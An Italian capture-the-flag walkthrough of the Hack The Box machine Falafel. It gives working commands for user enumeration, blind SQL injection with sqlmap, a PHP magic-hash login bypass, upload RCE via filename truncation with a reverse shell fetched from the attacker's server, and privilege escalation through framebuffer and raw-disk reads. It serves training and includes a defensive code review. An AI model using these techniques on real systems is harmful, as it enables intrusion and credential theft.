---
title: 'HTB Falafel Walkthrough: SQLi, PHP Type Juggling e Privesc'
slug: htb-falafel-walkthrough
description: 'Write-Up alla macchina Falafel di Hack The Box: enumerazione utenti, blind SQL injection, bypass login PHP, RCE upload e privilege escalation Linux.'
image: /falafel-walktrough-htb.webp
draft: false
date: 2026-07-25T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - type-juggling
  - file-upload
  - htb writeup
---

# HTB Falafel Walkthrough: SQLi, PHP Type Juggling e Privesc via /dev

## Ricognizione iniziale

Si parte con [nmap](https://hackita.it/articoli/nmap/): solo due porte aperte, 22 (ssh) e 80 (http).

```bash
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.73
nmap -sC -sV -p 80,22 -oA nmap/scripts 10.10.10.73
```

Il sito espone un `robots.txt` che disabilita `*.txt`. Un `robots.txt` che nasconde un'estensione è quasi sempre un invito a includerla nel bruteforce delle directory, quindi via con [gobuster](https://hackita.it/articoli/gobuster/):

```bash
gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 30
```

Tra i risultati salta fuori `cyberlaw.txt`: una mail interna dell'admin che si lamenta perché un utente, "chris", è riuscito a loggarsi nel suo account senza password e a prendere il controllo del sito tramite la funzione di upload immagini. In pratica l'admin ci sta descrivendo da solo l'intera catena d'attacco.

## Enumerazione username con ffuf

Prima di arrivare a un piano preciso, provo a mano qualche tentativo di SQL injection diretta nel campo username (apici, `OR 1=1`, roba basica) — ma il form risponde con errori generici o niente di utile, quindi non è la strada immediata.

Guardando meglio le risposte del form, però, noto una cosa più interessante: il messaggio cambia a seconda che lo username esista o meno. Se lo username non esiste, il form dice "Try again"; se esiste ma la password è sbagliata, dice "Wrong identification: \<user>". Questa differenza è di per sé un canale di enumerazione — non serve indovinare la password, basta guardare quale messaggio torna indietro per capire se un nome utente esiste nel database.

Provo quindi una wordlist di nomi comuni contro il campo username, filtrando via le risposte "standard":

```bash
ffuf -c -w /opt/SecLists/Usernames/Names/names.txt \
  -X POST -d "username=FUZZ&password=abcd" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.10.10.73/login.php \
  -fs 7074
```

`-fs 7074` filtra via le risposte "Try again" (username inesistente) in base alla dimensione della risposta, lasciando solo i veri positivi. Su tutta la wordlist, solo due nomi restituiscono "Wrong identification": `admin` e `chris`. Sono questi i due utenti validi con cui lavorare.

## Blind SQL injection con sqlmap

Dato che il messaggio di errore cambia in base all'esistenza dello username, il campo è quasi certamente concatenato in una query tipo `SELECT * FROM users WHERE username='...'`. Questo si sfrutta con una **boolean-based blind SQLi**, usando l'opzione `--string` di sqlmap per dire allo strumento quale stringa nella risposta corrisponde a "vero".

```bash
sqlmap -r login-chris.request --level 5 --risk 3 --batch --string "Wrong identification"
```

Confermata l'injection sul parametro `username`, si passa al dump:

```bash
sqlmap -r login-chris.request --level 5 --risk 3 --batch --string "Wrong identification" --dump
```

Escono due hash md5: quello di `chris` viene craccato subito da sqlmap stesso (`juggling`), quello di `admin` no — nemmeno con hashcat e rockyou.

## Bypass login admin: PHP type juggling

L'hash di admin (`0e462096931906507119562988736854`) inizia con `0e` seguito da sole cifre. In PHP, se il confronto usa `==` invece di `===`, una stringa del tipo `"0e123"` viene interpretata come notazione scientifica (0 elevato a qualcosa), quindi:

```php
php > var_dump("0e462096931906507119562988736854" == "0e123456789");
bool(true)
```

Esistono liste di stringhe note (i cosiddetti *magic hash*) il cui md5 produce proprio questo pattern. Usando `240610708` come password, il confronto lato server risulta "vero" pur non conoscendo la password reale, e si entra come admin.

## RCE via upload: truncation del nome file

Da admin si sblocca `upload.php`: prende un URL, scarica l'immagine e la salva con lo stesso nome, con whitelist sulle estensioni (`png`, `gif`, `jpg`). Prima di trovare la strada giusta, un bel po' di tentativi falliscono — ne parlo più nel dettaglio, con tutti i payload provati e perché non funzionano, in [questo articolo dedicato agli attacchi di file upload](https://hackita.it/articoli/file-upload-attack/). In breve, qui non hanno funzionato:

```text
http://IP:8081/cmd.php'; echo png #        -> nessun upload
http://IP:8081/cmd.php';test.png            -> stringa intera salvata così com'è
http://IP:8081/cmd.php;.jpg                 -> accessibile solo col path completo
http://IP:8081/cmd.php%00.jpg               -> null byte non funziona (PHP moderno)
http://IP:8081/cmd.php%27%3b%20echo%20test%23.png -> richiesta per l'URL intero, non bypassa nulla
```

La svolta arriva da un dettaglio nel profilo admin: un accenno ai limiti di lunghezza. Provo a mano, senza automatismi, mandando un nome file da 300 caratteri (una sequenza di `A` seguita da `.png`):

```bash
URL="http://10.10.14.x:8081/$(python3 -c 'print("A"*300)').png"
curl -s -X POST \
  -H 'Referer: http://10.10.10.73/upload.php' \
  --data-urlencode "url=$URL" \
  'http://10.10.10.73/upload.php'
```

Il server risponde con un errore tipo "The name is too long" e prova a tagliare il nome per farlo rientrare. Guardando la stringa troncata che restituisce, capisco due cose: il taglio scatta ben oltre le 232 `A` iniziali, e vengono tagliati **esattamente gli ultimi 4 caratteri**, non un numero a caso. Facendo due conti tra i vari tentativi, il limite reale è 236 caratteri totali salvati.

Quindi il piano è: costruire un nome da 236 caratteri che termini in `.php`, e aggiungere in coda `.png` solo per superare il controllo whitelist. Il server tronca via proprio quel `.png` finale, e quello che resta salvato su disco finisce per `.php` — file eseguibile, whitelist bypassata.

Prendo una reverse shell PHP da [revshells.com](https://www.revshells.com/), la salvo in una cartella locale con un nome che rispetta esattamente lo schema (232 caratteri di riempimento + `.php`), e la servo con il webserver di Python:

```bash
mv revshell.php "$(python3 -c 'print("A"*232)').php"
python3 -m http.server 8081
```

A quel punto ho semplicemente uploadato il file dall'URL che puntava alla mia reverse shell rinominata, con `.png` finale che il server tronca via.

La risposta del server conferma il path dove il file è finito salvato (con estensione `.php` reale). Metto in ascolto un listener e richiamo il file per attivare la reverse shell:

```bash
nc -lnvp 4444
curl "http://10.10.10.73/uploads/<dir>/AAAA...php"
```

Shell come `www-data`:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Nota tecnica: perché il taglio non è a 255 ma a 236

Un dubbio legittimo: ext4 (il filesystem della VM) ha un limite di 255 byte per nome file, quindi ci si aspetterebbe il taglio esattamente lì. Ma il taglio osservato scatta molto prima, intorno ai 236 caratteri — quindi **non è il filesystem** a tagliare.

Il messaggio che il server restituisce (`"The name is too long..."`, `"Trying to shorten..."`, `"New name is..."`) non è output di sistema: è testo stampato da codice PHP scritto apposta dal box, in un file di validazione che non è quello che abbiamo letto (`upload.php`) — probabilmente un file separato non recuperato durante l'exploitation.

Non avendo il codice originale sotto mano, la logica più plausibile, ricostruita dal comportamento osservato, è qualcosa del genere:

```php
<?php
$max_length = 236; // soglia osservata nel comportamento

if (strlen($filename) > $max_length) {
    echo "The name is too long, " . strlen($filename) . " chars total.\n";
    echo "Trying to shorten...\n";
    $filename = substr($filename, 0, $max_length); // tiene solo i primi 236 caratteri, il resto va perso
    echo "New name is " . $filename . ".\n";
}
```

Il punto debole è che `substr` taglia semplicemente tutto quello che supera la soglia, senza guardare se lì in mezzo c'è un'estensione o altro testo. Il calcolo nel nostro payload quadra così: 232 `A` + `.php` fanno esattamente 236 caratteri, cioè il file resta intero fino a lì; aggiungendo `.png` in coda si arriva a 240 caratteri totali, 4 oltre la soglia. Il filtro tiene i primi 236 e butta via il resto — e quei 4 caratteri di troppo coincidono esattamente con `.png`. Risultato: quello che rimane salvato è `...php`, un file eseguibile vero, anche se il controllo iniziale aveva validato un `.png`.

## Privesc: www-data → moshe

Nei file del sito, `connection.php` contiene le credenziali del database:

```php
define('DB_USERNAME', 'moshe');
define('DB_PASSWORD', 'falafelIsReallyTasty');
```

Password riciclata anche per l'utente di sistema `moshe`:

```bash
su moshe
```

`user.txt` è lì, nella sua home.

## Privesc: moshe → yossi (framebuffer)

I gruppi a cui appartiene moshe non sono i soliti. Tra questi c'è `video`, che dà accesso a `/dev/fb0`, il framebuffer della scheda video. Con `w` si nota che `yossi` è loggato fisicamente sulla console (tty1) — quindi ha qualcosa visualizzato sullo schermo in quel momento.

```bash
cat /dev/fb0 > screenshot.raw
cat /sys/class/graphics/fb0/virtual_size    # risoluzione dello schermo
```

Il file va scaricato e ricostruito come immagine. Il vecchio metodo "apri in GIMP come Raw image data, imposta la risoluzione, prova RGB565" oggi non è più affidabile: le versioni recenti di GIMP hanno cambiato il dialogo di import raw e non espongono più con la stessa comodità tutti i formati pixel del framebuffer (offset, endianness, ordine canali), quindi capita spesso di ottenere solo rumore anche col formato giusto in teoria.

Per evitare di perdere tempo a tentativi dentro GIMP, ho scritto **myrawpng**, uno script che automatizza il bruteforce di tutti i formati pixel ragionevoli (bgr0, rgba, bgra, rgb565, ecc.) usando ffmpeg e ImageMagick, e genera un PNG per ogni combinazione in una cartella — poi basta scorrerli e trovare quello leggibile:

[github.com/hack-ita/myrawpng](https://github.com/hack-ita/myrawpng)

```bash
myrawpng screenshot.raw 1176x885
```

Tra i vari PNG generati, più di uno risulta leggibile: in almeno uno c'è letteralmente uno screenshot con la password di `yossi` in chiaro.

```bash
ssh yossi@10.10.10.73
```

## Privesc: yossi → root (gruppo disk)

I gruppi di yossi includono `disk`, che dà accesso in lettura diretta ai device grezzi (`/dev/sda1`, `/dev/sda5` la swap), bypassando completamente i permessi sui singoli file del filesystem — perché si sta leggendo il blocco fisico, non passando dalla VFS. Ne parlo in dettaglio, con tutti i gruppi Linux sfruttabili per privesc, in [questo articolo](https://hackita.it/articoli/group-linux-privilege-escalation).

Con `debugfs` monto la partizione principale in sola lettura logica e vado dritto alla chiave privata SSH di root, senza bisogno di leggere flag o shadow:

```bash
debugfs /dev/sda1
debugfs:  cat /root/.ssh/id_rsa
```

Copio l'output in un file locale, sistemo i permessi e mi collego direttamente come root:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.10.10.73
```

## Analisi del codice sorgente

Una volta dentro come `www-data`, si può leggere il codice PHP reale del sito. Vale la pena analizzarlo pezzo per pezzo, perché conferma esattamente ogni bug sfruttato finora.

**`login_logic.php`** — qui gira la query vulnerabile:

```php
$sql = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($db,$sql);
$users = mysqli_fetch_assoc($result);
```

Lo username viene incollato dentro la stringa SQL senza escaping né prepared statement: da qui la blind SQLi. Subito dopo:

```php
if($password == $users['password']){
```

Confronto con `==` invece di `===` sull'hash: da qui il bypass con magic hash su admin. C'è anche un filtro anti-injection, ma solo su alcune parole chiave:

```php
if(preg_match('/(union|\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){
  $message="Hacking Attempt Detected!";
  goto end;
}
```

Blocca `union`, `sleep`, `benchmark` — ma non blocca affatto una blind boolean-based con `AND`/`OR` e `substring()`, che è esattamente quello che ha usato sqlmap.

**`authorized.php`** — decide chi può vedere cosa:

```php
if(basename($_SERVER['PHP_SELF']) == 'upload.php'){
    if($_SESSION['role'] != 'admin'){
        header('Location: profile.php');
        exit();
    }
}
```

Semplice controllo di ruolo in sessione: se non sei admin, upload.php ti rimanda a profile.php. Il controllo di per sé è corretto — il problema è che ci si arriva già "admin" grazie al bug precedente, quindi questo gate non serve a nulla in pratica.

**`upload.php`** — qui c'è la logica di download e la whitelist:

```php
$extension = strtolower($file['extension']);
$whitelist = ['png', 'gif', 'jpg'];
if (!in_array($extension, $whitelist)) {
  throw new Exception('Bad extension');
}
```

Controlla solo cosa c'è scritto dopo l'ultimo punto nel nome file. Nessun controllo sulla lunghezza qui — motivo per cui il troncamento (che avviene altrove, come spiegato sopra) riesce a bypassarlo: il controllo estensione viene fatto *prima* che il nome venga troncato in salvataggio, quindi al momento del check il nome sembra legittimamente `.png`.

```php
$cmd = "cd $userdir; timeout 3 wget " . escapeshellarg($good_url) . " 2>&1";
$output = shell_exec($cmd);
```

Qui il server esegue letteralmente un comando shell (`wget` sull'URL fornito) dentro una cartella dedicata. `escapeshellarg()` protegge da command injection sull'URL stesso, ma non protegge dal fatto che il file scaricato può poi essere eseguito come PHP se finisce con quell'estensione.

**`profile.php`** — solo output, nessuna logica di sicurezza: stampa contenuti diversi in base a `$_SESSION['user']`, hardcoded per `chris` e `admin`. Non introduce vulnerabilità ma conferma che il ruolo/nome utente vengono fidati ciecamente dalla sessione una volta autenticati.

## Conclusioni

Falafel è un box che incatena bene tecniche diverse: user enumeration, blind SQLi, PHP type juggling, un bug di troncamento non banale nell'upload, e chiude con due privesc che sfruttano l'appartenenza a gruppi Linux poco considerati (`video`, `disk`) invece delle solite SUID o sudo -l. Vale la pena rifarlo a mente fredda per capire bene ogni passaggio, senza guardare subito lo script finale.
